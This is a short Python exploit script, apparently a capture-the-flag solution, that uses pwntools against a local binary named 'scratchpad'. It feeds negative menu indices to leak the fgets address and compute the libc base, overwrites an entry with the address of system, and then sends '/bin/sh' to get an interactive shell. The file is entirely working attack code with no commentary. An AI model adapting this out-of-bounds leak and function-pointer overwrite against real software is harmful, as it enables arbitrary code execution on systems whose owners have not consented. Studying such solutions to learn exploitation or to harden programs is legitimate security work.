#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./scratchpad")
libc = elf.libc

io = elf.process()

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"? ", b"-7")

io.recvuntil(b":\n")

fgets_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
log.info(f"Leaked fgets address: 0x{fgets_addr:08x}")

libc.address = fgets_addr - libc.symbols.fgets
log.success(f"Leaked libc address: 0x{libc.address:08x}")

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"? ", b"-5")

io.sendlineafter(b"?\n", p64(libc.symbols.system))

io.sendlineafter(b"> ", b"/bin/sh\x00")
io.interactive()
